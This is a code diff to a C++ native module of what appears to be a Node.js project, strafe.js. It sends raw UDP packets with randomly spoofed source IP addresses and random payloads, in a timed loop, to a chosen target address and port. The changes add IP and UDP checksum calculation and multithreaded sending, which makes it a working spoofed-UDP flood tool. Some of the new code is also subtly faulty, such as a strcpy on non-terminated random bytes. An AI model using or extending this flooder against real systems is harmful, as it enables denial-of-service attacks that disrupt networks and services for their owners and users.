@@ -1,20 +1,20 @@
 /*
  * This file is part of strafe.js <https://github.com/hmes98318/strafe.js>
  * Copyright (C) 2022-2023  hmes98318  <hmes98318@gmail.com>
- * 
+ *
  * strafe.js is free software: you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or 
+ * the Free Software Foundation, either version 3 of the License, or
  * any later version.
- * 
+ *
  * strafe.js is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  * GNU General Public License for more details.
- * 
+ *
  * You should have received a copy of the GNU General Public License
  * along with strafe.js.  If not, see <https://www.gnu.org/licenses/>.
-*/
+ */
 
 
 #include <node.h>
@@ -53,9 +53,9 @@ struct Ip
     u_short checksum;  // IP Header Checksum
     u_int32_t saddr;   // Source IP Address
     u_int32_t daddr;   // Destination IP Address
-};  
+};
 /*
- *  0                   1                   2                   3   
+ *  0                   1                   2                   3
  *  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
  *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
  *  |Version|  IHL  |Type of Service|          Total Length         |
@@ -70,7 +70,7 @@ struct Ip
  *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
  *  |                    Options                    |    Padding    |
  *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-*/
+ */
 
 struct Udp
 {
@@ -80,7 +80,7 @@ struct Udp
     u_short checksum; // UDP Checksum
 };
 /*
- *  0                   1                   2                   3   
+ *  0                   1                   2                   3
  *  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2
  *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
  *  |           Source Port          |       Destination Port       |
@@ -89,22 +89,20 @@ struct Udp
  *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
  *  |                             data                              |
  *  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-*/
+ */
 
 struct Pseudo
 {
-    u_int32_t saddr; // Source IP Address
-    u_int32_t daddr; // Destination IP Address
-    u_char zero;     // Zero
-    u_char protocol; // Protocol
-    u_short length;  // Length of the UDP segment
+    u_int32_t saddr;  // Source IP Address
+    u_int32_t daddr;  // Destination IP Address
+    uint8_t zero;     // Zero
+    uint8_t protocol; // Protocol
+    uint16_t length;  // Length of the UDP segment
 };
-
 
 /* Generate random ipv4 address*/
 char *generate_ipv4()
 {
-
     uint32_t ipv4_addr = 0;
     char *ipv4_str = (char *)malloc(INET_ADDRSTRLEN);
 
@@ -118,18 +116,47 @@ char *generate_ipv4()
 }
 
 /* Generate random hex array*/
-void generate_hex_array(int length, unsigned char *array) {
-    for (int i = 0; i < length; i++) {
+u_char *generate_hex_array(int length)
+{
+    u_char *array;
+    array = (u_char *)malloc(length);
+
+    for (int i = 0; i < length; i++)
+    {
         array[i] = rand() % 256;
     }
+    return array;
+}
+
+uint16_t ip_checksum(const void *buf, size_t hdr_len)
+{
+    const uint16_t *data = static_cast<const uint16_t *>(buf);
+    uint32_t acc = 0;
+
+    for (size_t i = 0; i < hdr_len; i += 2)
+    {
+        if (i + 1 == hdr_len)
+        {
+            acc += static_cast<uint16_t>(data[i]) << 8;
+        }
+        else
+        {
+            acc += (static_cast<uint32_t>(data[i]) << 8) | static_cast<uint32_t>(data[i + 1]);
+        }
+    }
+
+    acc = (acc >> 16) + (acc & 0xFFFF);
+    acc = (acc >> 16) + (acc & 0xFFFF);
+
+    return static_cast<uint16_t>(~acc);
 }
 
 /* CRC16 checksum calculator */
-unsigned short checksum(unsigned short *ptr, int nbytes)
+u_short udp_checksum(unsigned short *ptr, int nbytes)
 {
-    unsigned long sum;
+    long sum;
     unsigned short oddbyte;
-    unsigned short answer;
+    short answer;
 
     sum = 0;
     while (nbytes > 1)
@@ -137,7 +164,6 @@ unsigned short checksum(unsigned short *ptr, int nbytes)
         sum += *ptr++;
         nbytes -= 2;
     }
-
     if (nbytes == 1)
     {
         oddbyte = 0;
@@ -146,87 +172,76 @@ unsigned short checksum(unsigned short *ptr, int nbytes)
     }
 
     sum = (sum >> 16) + (sum & 0xffff);
-    sum += (sum >> 16);
-    answer = (short)~sum;
+    sum = sum + (sum >> 16);
 
-    return answer;
+    return (short)(~sum);
 }
 
-/* Fill in IP header, UDP header
- * Calculate Pseudo UDP header checksum
- */
-void init_header(struct Ip *ip, struct Udp *udp, struct Pseudo *pseudo)
+/* Fill in IP header, UDP header, Pseudo UDP header */
+void init_header(struct Ip *ip, struct Udp *udp, struct Pseudo *pseudo, char *buf, int packetsize)
 {
+    char *src_ip = generate_ipv4();
+
     // IP header
     ip->ver_ihl = (4 << 4) | (sizeof(Ip) / sizeof(unsigned int));
     ip->tos = 0;
-    ip->total_len = htons(sizeof(Ip) + sizeof(struct Udp));
+    ip->total_len = sizeof(struct Ip) + sizeof(struct Udp) + packetsize;
     ip->id = htons(54321);
     ip->frag_off = 0;
     ip->ttl = 64;
     ip->protocol = IPPROTO_UDP;
     ip->checksum = 0;
-    ip->saddr = 0;
+    ip->saddr = inet_addr(src_ip);
     ip->daddr = inet_addr(dst_ip);
+    ip->checksum = ip_checksum((u_short *)buf, ip->total_len);
 
     // UDP header
     udp->sport = htons(1024);
     udp->dport = htons(dst_port);
-    udp->len = htons(sizeof(Udp));
+    udp->len = htons(sizeof(struct Udp) + packetsize);
     udp->checksum = 0;
 
     // Pseudo UDP header
+    pseudo->saddr = inet_addr(src_ip);
+    pseudo->daddr = inet_addr(dst_ip);
     pseudo->zero = 0;
     pseudo->protocol = IPPROTO_UDP;
-    pseudo->length = htons(sizeof(struct Udp));
-    pseudo->daddr = inet_addr(dst_ip);
+    pseudo->length = htons(sizeof(struct Udp) + packetsize);
 }
 
 void *send_UDP(void *addr_info, int timeout = 60, int delay = 1000, int packetsize = 10)
 {
-    struct Ip ip;
-    struct Udp udp;
-    struct Pseudo pseudo;
-    struct sockaddr_in *dest_addr = (struct sockaddr_in *)addr_info;
+    struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
 
-    char buf[100];
-    unsigned char data[packetsize]; // UDP Data
+    char buf[1460], *pseudogram;
+    memset(buf, 0, sizeof(buf)); // char buf[100], *pseudogram;
+
+    struct Ip *ip = (struct Ip *)buf;
+    struct Udp *udp = (struct Udp *)(buf + sizeof(struct Ip));
+    struct Pseudo pseudo;
+
+    char *data = buf + sizeof(struct Ip) + sizeof(struct Udp);
     int count = 0; // Packet sent count
 
     auto start_time = std::chrono::steady_clock::now();
     srand((unsigned)time(NULL));
 
-
-    init_header(&ip, &udp, &pseudo);
-
     while (true)
     {
-        ip.saddr = inet_addr(generate_ipv4());
-        generate_hex_array(packetsize, data);
+        strcpy(data, (const char *)generate_hex_array(packetsize));
+        init_header(ip, udp, &pseudo, buf, packetsize);
 
-        // Calculate IP checksum
-        memset(buf, 0, sizeof(buf));
-        memcpy(buf, &ip, sizeof(struct Ip));
-        ip.checksum = checksum((u_short *)buf, sizeof(struct Ip));
+        int psize = sizeof(struct Pseudo) + sizeof(struct Udp) + packetsize;
+        pseudogram = (char *)malloc(psize);
 
-        pseudo.saddr = ip.saddr;
+        memcpy(pseudogram, (char *)&pseudo, sizeof(struct Pseudo));
+        memcpy(pseudogram + sizeof(struct Pseudo), udp, sizeof(struct Udp) + packetsize);
 
-        // Calculate UDP checksum
-        memset(buf, 0, sizeof(buf));
-        memcpy(buf, &pseudo, sizeof(pseudo));
-        memcpy(buf + sizeof(pseudo), &udp, sizeof(udp));
-        udp.len = htons(sizeof(udp) + sizeof(data));
-        udp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(udp));
-
-        // Build Data packet
-        char packet[sizeof(ip) + sizeof(udp) + sizeof(data)];
-        memset(packet, 0, sizeof(packet));
-        memcpy(packet, &ip, sizeof(ip));
-        memcpy(packet + sizeof(ip), &udp, sizeof(udp));
-        memcpy(packet + sizeof(ip) + sizeof(udp), (u_short *)data, sizeof(data));
+        // Calculate Pseudo UDP header checksum
+        udp->checksum = udp_checksum((u_short *)pseudogram, psize);
 
         // Send data packet
-        if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)dest_addr, sizeof(struct sockaddr)) < 0)
+        if (sendto(sockfd, buf, ip->total_len, 0, (struct sockaddr *)addr, sizeof(struct sockaddr)) < 0)
         {
             perror("sendto");
             exit(EXIT_FAILURE);
@@ -234,7 +249,6 @@ void *send_UDP(void *addr_info, int timeout = 60, int delay = 1000, int packetsi
 
         printf("\033[F");
         printf("Sent UDP Packet: %d       \n", count++);
-
 
         // Timeout Checker
         auto current_time = std::chrono::steady_clock::now();
@@ -263,6 +277,7 @@ void Method(const FunctionCallbackInfo<Value> &args)
     int timeout = args[2]->Int32Value(isolate->GetCurrentContext()).ToChecked();
     int delay = args[3]->Int32Value(isolate->GetCurrentContext()).ToChecked();
     int packetsize = args[4]->Int32Value(isolate->GetCurrentContext()).ToChecked();
+    int numThreads = args[5]->Int32Value(isolate->GetCurrentContext()).ToChecked();
 
     // Get the destination IP address and port number from the arguments
     String::Utf8Value str_ip(isolate, args[0]);
@@ -291,8 +306,27 @@ void Method(const FunctionCallbackInfo<Value> &args)
         exit(1);
     }
 
-    printf("start send\n");
-    send_UDP(&addr, timeout, delay, packetsize);
+    printf("start process.\n");
+
+    // Create threads
+    std::thread threads[numThreads];
+    for (int i = 0; i < numThreads; i++)
+    {
+        threads[i] = std::thread(send_UDP, &addr, timeout, delay, packetsize);
+
+        if (threads[i].get_id() == std::thread::id())
+        {
+            printf("Failed to create thread %d", i);
+            exit(1);
+        }
+        printf("\n");
+    }
+
+    for (int i = 0; i < numThreads; i++)
+    {
+        threads[i].join();
+    }
+
     printf("Stop all process.\n");
     close(sockfd);
 }
